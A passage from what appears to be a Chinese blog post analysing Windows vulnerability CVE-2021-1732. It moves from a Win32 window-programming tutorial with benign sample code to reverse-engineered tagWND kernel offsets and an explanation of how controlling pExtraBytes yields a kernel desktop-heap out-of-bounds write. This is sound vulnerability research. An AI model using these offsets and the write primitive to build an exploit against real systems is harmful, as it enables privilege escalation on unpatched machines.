这里就使用 hInstance</span></span><br><span class="line">	wndclass.lpszClassName = <span class="string">L&quot;TestWndClass&quot;</span>; <span class="comment">// 窗口类名称</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 注册窗口类 */</span></span><br><span class="line">	<span class="built_in">RegisterClassEx</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 创建窗口 */</span></span><br><span class="line">	hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line">		<span class="literal">NULL</span>,                              <span class="comment">// 扩展窗口风格</span></span><br><span class="line">		<span class="string">L&quot;TestWndClass&quot;</span>,                   <span class="comment">// 窗口类名</span></span><br><span class="line">		<span class="string">L&quot;Hello World&quot;</span>,                    <span class="comment">// 窗口标题</span></span><br><span class="line">		WS_OVERLAPPEDWINDOW | WS_VISIBLE,  <span class="comment">// 窗口风格</span></span><br><span class="line">		CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 x 坐标 - 这里使用默认值</span></span><br><span class="line">		CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 y 坐标 - 这里使用默认值</span></span><br><span class="line">		CW_USEDEFAULT,                     <span class="comment">// 窗口宽度 - 这里使用默认值</span></span><br><span class="line">		CW_USEDEFAULT,                     <span class="comment">// 窗口高度 - 这里使用默认值</span></span><br><span class="line">		<span class="literal">NULL</span>,                              <span class="comment">// 父窗口句柄</span></span><br><span class="line">		<span class="literal">NULL</span>,                              <span class="comment">// 菜单句柄</span></span><br><span class="line">		hInstance,                         <span class="comment">// 窗口句柄</span></span><br><span class="line">		<span class="literal">NULL</span>                               <span class="comment">// 该值会传递给窗口 WM_CREATE 消息的一个参数</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 消息循环 */</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">TranslateMessage</span>(&amp;msg);   <span class="comment">// 翻译消息</span></span><br><span class="line">		<span class="built_in">DispatchMessage</span>(&amp;msg);    <span class="comment">// 派发消息</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行起来，你便得到了一个标题是 Hello World 的窗口：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/windows_desktop_program/1.png" alt="1"></p>
<p>在窗口中右键会弹出一个对话框：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/windows_desktop_program/2.png" alt="2"></p>
<p>我来解释一下这个程序是怎么工作的。首先，桌面应用对于程序员而言的入口点从常见的 main 变成了 <strong>WinMain</strong>（这里的 wWinMain 是 unicode 版 WinMain，表明程序中使用的字符为 unicode 编码）。其次，需要有个概念，那就是我们平常看到的应用程序窗口，都是某个<strong>窗口类</strong>的”实例”（注意，这里的类不是 C++ 类的概念），Windows 使用一个结构体来管理 行为/风格 相似一类窗口，其定义<sup>[6]</sup>如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagWNDCLASSEXW</span> &#123;</span></span><br><span class="line">    UINT        cbSize;        <span class="comment">// 该结构体的大小，通过这个字段来区分桌面开发的新旧版本</span></span><br><span class="line">    <span class="comment">/* Win 3.x */</span></span><br><span class="line">    UINT        style;         <span class="comment">// 窗口类的风格</span></span><br><span class="line">    WNDPROC     lpfnWndProc;   <span class="comment">// 窗口的消息处理函数</span></span><br><span class="line">    <span class="keyword">int</span>         cbClsExtra;    <span class="comment">// 窗口类的扩展内存大小</span></span><br><span class="line">    <span class="keyword">int</span>         cbWndExtra;    <span class="comment">// 窗口的扩展内存大小</span></span><br><span class="line">    HINSTANCE   hInstance;     <span class="comment">// 该窗口类的窗口消息处理函数所属的应用实例</span></span><br><span class="line">    HICON       hIcon;         <span class="comment">// 该窗口类所用的图标</span></span><br><span class="line">    HCURSOR     hCursor;       <span class="comment">// 该窗口类所用的光标</span></span><br><span class="line">    HBRUSH      hbrBackground; <span class="comment">// 该窗口类所用的背景刷</span></span><br><span class="line">    LPCWSTR     lpszMenuName;  <span class="comment">// 该窗口类所用的菜单资源</span></span><br><span class="line">    LPCWSTR     lpszClassName; <span class="comment">// 该窗口类的名称</span></span><br><span class="line">    <span class="comment">/* Win 4.0 */</span></span><br><span class="line">    HICON       hIconSm;       <span class="comment">// 该窗口类所用的小像标</span></span><br><span class="line">&#125; WNDCLASSEXW;</span><br></pre></td></tr></table></figure>

<p>从窗口类的定义可以看出，它包含了一个窗口的重要信息，如窗口风格、窗口过程、显示和绘制窗口所需要的信息，等等。可以使用 VS 自带的工具 Microsoft spy++ 来实际感知窗口类的存在，比如计算器对应的窗口类是 Windows.UI.Core.CoreWindow：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/windows_desktop_program/3.png" alt="3"></p>
<p>所以想要创建一个窗口”实例”，需要先向系统注册一个窗口类，这就是为什么开始的代码要这样写：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;; <span class="comment">// 创建窗口类结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 对窗口类的各属性进行初始化 */</span></span><br><span class="line">wndclass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);     <span class="comment">// 字段 cbSize 需要等于结构体 WNDCLASSEX 的大小</span></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW; <span class="comment">// 窗口类风格 - 窗口水平/竖直方向的长度变化时重绘整个窗口</span></span><br><span class="line">wndclass.lpfnWndProc = MyWndProc;         <span class="comment">// 窗口消息处理函数 - 这里使用上面声明的 MyWndProc</span></span><br><span class="line">wndclass.hInstance = hInstance;           <span class="comment">// 该窗口类的窗口消息处理函数所属的应用实例 - 这里就使用 hInstance</span></span><br><span class="line">wndclass.lpszClassName = <span class="string">L&quot;TestWndClass&quot;</span>; <span class="comment">// 窗口类名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册窗口类 */</span></span><br><span class="line"><span class="built_in">RegisterClassEx</span>(&amp;wndclass);</span><br></pre></td></tr></table></figure>

<p>现在我们就能用这个窗口类来创建看得见、摸得着的窗口了。创建窗口使用 CreateWindowEx<sup>[7]</sup> 函数，通过下面的代码，我们就能成功创建一个可见的窗口并得到它的窗口句柄：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 创建窗口 */</span></span><br><span class="line">hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line">	<span class="literal">NULL</span>,                              <span class="comment">// 扩展窗口风格</span></span><br><span class="line">	<span class="string">L&quot;TestWndClass&quot;</span>,                   <span class="comment">// 窗口类名</span></span><br><span class="line">	<span class="string">L&quot;Hello World&quot;</span>,                    <span class="comment">// 窗口标题</span></span><br><span class="line">	WS_OVERLAPPEDWINDOW | WS_VISIBLE,  <span class="comment">// 窗口风格</span></span><br><span class="line">	CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 x 坐标 - 这里使用默认值</span></span><br><span class="line">	CW_USEDEFAULT,                     <span class="comment">// 窗口左上角 y 坐标 - 这里使用默认值</span></span><br><span class="line">	CW_USEDEFAULT,                     <span class="comment">// 窗口宽度 - 这里使用默认值</span></span><br><span class="line">	CW_USEDEFAULT,                     <span class="comment">// 窗口高度 - 这里使用默认值</span></span><br><span class="line">	<span class="literal">NULL</span>,                              <span class="comment">// 父窗口句柄</span></span><br><span class="line">	<span class="literal">NULL</span>,                              <span class="comment">// 菜单句柄</span></span><br><span class="line">	hInstance,                         <span class="comment">// 窗口句柄</span></span><br><span class="line">	<span class="literal">NULL</span>                               <span class="comment">// 该值会传递给窗口 WM_CREATE 消息的一个参数</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>创建了窗口后，如果后面什么代码都不写，那程序就直接退出，创建的窗口也立马被销毁了，这个不能交互的桌面应用对用户来说毫无意义。为了给创建出的窗口注入灵魂，最后往往会加一个 while 主消息循环：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 消息循环 */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">TranslateMessage</span>(&amp;msg);   <span class="comment">// 翻译消息</span></span><br><span class="line">	<span class="built_in">DispatchMessage</span>(&amp;msg);    <span class="comment">// 派发消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们常常能听到一些名词，如事件驱动、Windows 消息处理机制等，这些概念集中体现在上面这个 while 循环中。为什么在窗口中右键，会弹出一个对话框？那是因为鼠标右键按下被视作了一个事件，当这个事件在窗口中发生时，系统会去调用窗口所属窗口类的 WNDCLASSEX.lpfnWndProc 回调函数来响应，这个函数中写了弹出对话框的代码，因此才会有这样的效果。</p>
<p>那么问题来了，为什么我按鼠标左键它不会弹出对话框？照你这个说法，鼠标左键按下也是一个事件，系统不也会调用同一个回调 WNDCLASSEX.lpfnWndProc，那行为应该相同（即弹出对话框）才对啊？诚然，不论是左键还是右键按下，该窗口的 WNDCLASSEX.lpfnWndProc 都会被调用，而结果我们也清楚 —— 只有右键按下才会弹出对话框，这个函数是怎么做到区分左/右键按下的呢？</p>
<p>事实上，操作系统会把每个到来的事件包装成一个消息结构体（MSG 结构体，不是本文关注点，这里就不列出它的各个字段了），这个结构体记录了事件发生在哪个窗口（窗口句柄）、事件对应的消息编号（<strong>每种事件都对应了一个唯一的编号</strong>）、事件发生时所处的坐标等。系统将这个 MSG 结构体放入线程的消息队列，当线程调用 GetMessage 时，就能从队列中取出这个结构体，再通过 DispatchMessage 根据 MSG 结构体中的窗口句柄，向对应窗口递送该消息（具体体现就是调用那个窗口的 lpfnWndProc）。TranslateMessage 函数用于做一些虚拟键消息转换，与我们所说的内容关系不大，可以忽略掉这个函数。</p>
<p>现在就可以解释为什么按下左键没有弹出对话框了，来看本例代码中的窗口过程函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (message)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> WM_RBUTTONDOWN:	<span class="comment">// #define WM_RBUTTONDOWN 0x0204 - 代表鼠标右键按下</span></span><br><span class="line">			<span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;Right Button Down Detected&quot;</span>, <span class="string">L&quot;Message Arrival&quot;</span>, MB_OK); <span class="comment">// 简单弹个对话框</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam); <span class="comment">// 对其他消息都使用默认方式处理</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>左键按下和右键按下是不同的事件，它们的消息编号不同，所以当回调 MyWndProc 先后被调用时，参数 message 的值就不同（分别是 WM_<strong>L</strong>BUTTONDOWN 和 WM_<strong>R</strong>BUTTONDOWN）。在函数实现中，通过一个 switch 语句来判断消息的类型，针对不同的消息，采取不同的相应措施。比如上面的代码，我们判断当消息是右键按下时就弹个对话框，其他的消息使用默认方式处理（这种窗口中左键按下的默认处理方式就是什么也不做）。</p>
<p>有了上面的基本概念后，我们来拓展聊聊 WNDCLASSEX 结构体的 cbClsExtra 和 cbWndExtra 字段，之前注释里也写了，它们分别表示<strong>窗口类</strong>的扩展内存大小和<strong>窗口</strong>的扩展内存大小，那扩展内存有什么用？二者又有什么区别呢？</p>
<p>先说说什么是<strong>窗口类</strong>的扩展内存。在应用程序注册一个窗口类时，可以让系统分配一定大小的内存空间，作为该窗口类的扩展内存，之后属于该窗口类的每个窗口都共享这片内存区域，每个窗口都可以通过 Windows 提供的 API 来读写这片扩展内存，如 GetClassLong、GetClassLongPtr、SetClassLong、SetClassLongPtr 等（Ptr 后缀是为了兼容 32 和 64 位），以此实现同窗口类的窗口间通信，而 cbClsExtra 字段就记录了这片内存的大小。</p>
<p>同理，当<strong>窗口</strong>创建时，可以让系统分配一定大小的内存空间，作为该窗口的扩展内存，这就是窗口的扩展内存。这片内存每个窗口独享，也可以通过 API 来读写（GetWindowLong、GetWindowLongPtr、SetWindowLong、SetWindowLongPtr），该机制提供了一种窗口数据暂存的方式，这片内存的大小由 cbWndExtra 字段记录。</p>
<p>还是通过一个实例来感受 cbWndExtra 字段的意义：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* 通过 GetWindowLongPtr 获取偏移为 0 和 8 的两个 long long 的值 */</span></span><br><span class="line">	LONG_PTR A = <span class="built_in">GetWindowLongPtr</span>(hWnd, <span class="number">0</span>);</span><br><span class="line">	LONG_PTR B = <span class="built_in">GetWindowLongPtr</span>(hWnd, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">wchar_t</span>* content = <span class="keyword">new</span> <span class="keyword">wchar_t</span>[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (message)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_LBUTTONDOWN:  <span class="comment">// 左键按下时，输出 A 的值</span></span><br><span class="line">		<span class="built_in">wsprintf</span>(content, <span class="string">L&quot;%p&quot;</span>, A);</span><br><span class="line">		<span class="built_in">MessageBox</span>(hWnd, content, <span class="string">L&quot;Left Button Down&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_RBUTTONDOWN:  <span class="comment">// 右键按下时，输出 B 的值</span></span><br><span class="line">		<span class="built_in">wsprintf</span>(content, <span class="string">L&quot;%p&quot;</span>, B);</span><br><span class="line">		<span class="built_in">MessageBox</span>(hWnd, content, <span class="string">L&quot;Right Button Down&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HWND hwnd;</span><br><span class="line">	MSG msg;</span><br><span class="line">	WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	wndclass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);</span><br><span class="line">	wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">	wndclass.lpfnWndProc = MyWndProc;</span><br><span class="line">	wndclass.hInstance = hInstance;</span><br><span class="line">	wndclass.lpszClassName = <span class="string">L&quot;TestWndClass&quot;</span>;</span><br><span class="line">	<span class="comment">/* 使用 cbWndExtra 字段，设置扩展内存大小为两个 long long */</span></span><br><span class="line">	wndclass.cbWndExtra = <span class="number">2</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RegisterClassEx</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line">	hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line">		<span class="literal">NULL</span>, <span class="string">L&quot;TestWndClass&quot;</span>, <span class="string">L&quot;Hello World&quot;</span>,</span><br><span class="line">		WS_OVERLAPPEDWINDOW | WS_VISIBLE,</span><br><span class="line">		CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">		CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 通过 SetWindowLongPtr 设置偏移为 0 和 8 的两个 long long 的值 */</span></span><br><span class="line">	<span class="built_in">SetWindowLongPtr</span>(hwnd, <span class="number">0</span>, <span class="number">0xAAAAAAAAAAAAAAAA</span>);</span><br><span class="line">	<span class="built_in">SetWindowLongPtr</span>(hwnd, <span class="number">8</span>, <span class="number">0xBBBBBBBBBBBBBBBB</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">		<span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行起来，按下左键：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/windows_desktop_program/4.png" alt="4"></p>
<p>按下右键：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/windows_desktop_program/5.png" alt="5"></p>
<p>好了，关于 Windows 桌面编程就先聊到这儿吧，花了不少的篇幅来引出 cbWndExtra 字段，是因为该字段不为 0（窗口具有扩展内存）正是 CVE-2021-1732 漏洞利用的导火索。</p>
<br>

<h3 id="tagWND-结构体"><a href="#tagWND-结构体" class="headerlink" title="tagWND 结构体"></a>tagWND 结构体</h3><p>与每个窗口类对应一个结构体类似，Windows 使用 tagWND 结构体来描述每个窗口，这个结构体在加载了官方 pdb 文件的 Win7 win32k.sys 模块可以找到<sup>[8]</sup>。可能是由于泄露了太多对开发者无用的内核符号，导致 win32k 被五花八门的漏洞利用手段玩坏了，Win7 往后，微软去掉了 pdb 文件中很多内核符号，其中就包括 tagWND。所以目前，我们只能通过参考 Win7 及以前的符号，并结合 API 逆向分析来推测 Win10 中 tagWND 各字段的含义。</p>
<p>值得庆幸的是，已经有人在这方面做了很多工作了。在前辈们的经验总结下<sup>[8][9][10]</sup>，我们可以得知，在 Win10 中，<strong>对于每个窗口，系统为用户层和内核层各维护了一个 tagWND 结构体</strong>，用户层的 &amp;tagWND + 0x28 处的 8 字节为一个指针，指向内核层 tagWND 结构体。后文将使用 tagWND/tagWNDk 来表示 用户层/内核层 tagWND 结构体，ptagWND/ptagWNDk 来表示 用户层/内核层 tagWND 结构体指针。</p>
<p>下面列出 tagWND 结构体中与漏洞相关的字段（一个”Tab 缩进 + 偏移量”表示一次<strong>父级的值加偏移后访存</strong>）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ptagWND(user layer)</span><br><span class="line">	0x10 unknown</span><br><span class="line">		0x00 pTEB</span><br><span class="line">			0x220 pEPROCESS(of current process)</span><br><span class="line">	0x18 unknown</span><br><span class="line">		0x80 kernel desktop heap base</span><br><span class="line">	0x28 ptagWNDk(kernel layer)</span><br><span class="line">		0x00 hwnd</span><br><span class="line">		0x08 kernel desktop heap base offset</span><br><span class="line">		0x18 dwStyle</span><br><span class="line">		0x58 Window Rect left</span><br><span class="line">		0x5C Window Rect top</span><br><span class="line">		0x98 spMenu(uninitialized)</span><br><span class="line">		0xC8 cbWndExtra</span><br><span class="line">		0xE8 dwExtraFlag</span><br><span class="line">		0x128 pExtraBytes</span><br><span class="line">	0x90 spMenu(analyzed by myself)</span><br><span class="line">		0x00 hMenu</span><br><span class="line">		0x18 unknown0</span><br><span class="line">			0x100 unknown</span><br><span class="line">				0x00 pEPROCESS(of current process)</span><br><span class="line">		0x28 unknown1</span><br><span class="line">			0x2C cItems(for check)</span><br><span class="line">		0x40 unknown2(for check)</span><br><span class="line">		0x44 unknown3(for check)</span><br><span class="line">		0x50 ptagWND</span><br><span class="line">		0x58 rgItems</span><br><span class="line">			0x00 unknown(for exploit)</span><br><span class="line">		0x98 spMenuk</span><br><span class="line">			0x00 pSelf</span><br></pre></td></tr></table></figure>

<p>后面的分析在用到 tagWND 时，可以翻回这个部分进行查阅。</p>
<br>

<h3 id="以结果为导向"><a href="#以结果为导向" class="headerlink" title="以结果为导向"></a>以结果为导向</h3><p>本 CVE 的 POC 所达到的效果，就是可以在用户态调用 SetWindowLong 来造成一次<strong>内核桌面堆的越界写</strong>。SetWindowLong 实际调用 user32!SetWindowLongW，其中又调用了 win32u!NtUserSetWindowLong：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/result_based/1.png" alt="1"></p>
<p>之后通过系统调用进入内核态，调用 win32kfull!NtUserSetWindowLong，并最终调用 win32kfull!xxxSetWindowLong，传入根据窗口句柄找到的 tagWND 结构体地址（ptagWND）、写入的扩展内存的偏移（nIndex）、要写入的值（value）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/result_based/2.png" alt="2"></p>
<p>调用栈我也贴在这里：<br><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/result_based/3.png" alt="3"></p>
<p>进入 xxxSetWindowLong 后，在 59 行获得了内核 tagWND 结构体指针：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/result_based/4.png" alt="4"></p>
<p>从 117 行可以看出 <strong>nIndex 的值必须小于 ptagWNDk-&gt;cbWndExtra</strong>（窗口扩展内存大小，该值在注册窗口类时指定）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/result_based/5.png" alt="5"></p>
<p>由 157、158、162 行可知当 <code>ptagWNDk-&gt;dwExtraFlag &amp; 0x800 != 0</code> 时，<strong>内核桌面堆起始地址 + pExtraBytes + nIndex</strong> 处的 4 字节会被赋值成 value：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/result_based/6.png" alt="6"></p>
<p>POC 就是通过控制 pExtraBytes 为任意值来实现桌面堆越界写的。从上图的 160 行也可以看出，当 <code>ptagWNDk-&gt;dwExtraFlag &amp; 0x800 == 0</code> 时，pExtraBytes 就解释为一个<strong>可写内存的地址</strong>，直接通过 <code>pExtraBytes + nIndex</code> 来寻址。</p>
<p>故我们发现，tagWNDk 实际上使用<strong>两种模式</strong>来保存<strong>窗口扩展内存的地址</strong>：</p>
<ul>
<li>dwExtraFlag &amp; 0x800 == 0：在<strong>用户空间系统堆</strong>中，pExtraBytes 解释为<strong>扩展内存</strong>在<strong>用户空间堆</strong>中的地址指针</li>
<li>dwExtraFlag &amp; 0x800 != 0：在<strong>内核空间桌面堆</strong>中，pExtraBytes 解释为该<strong>扩展内存起始地址</strong>相对于<strong>内核桌面堆基址</strong>的偏移量</li>
</ul>
<p>下一部分就将介绍正常情况下两种模式对应的 pExtraBytes 是如何被赋值的。</p>
<br>

<h3 id="两种模式下-pExtraBytes-正常赋值流程"><a href="#两种模式下-pExtraBytes-正常赋值流程" class="headerlink" title="两种模式下 pExtraBytes 正常赋值流程"></a>两种模式下 pExtraBytes 正常赋值流程</h3><blockquote>
<p>模式 1 - 在用户空间系统堆中（直接寻址模式）</p>
</blockquote>
<p>该模式下，tagWNDk.pExtraBytes 在调用 CreateWindowEx 创建窗口的过程中被赋值。前半部分的调用链没有什么信息量：</p>
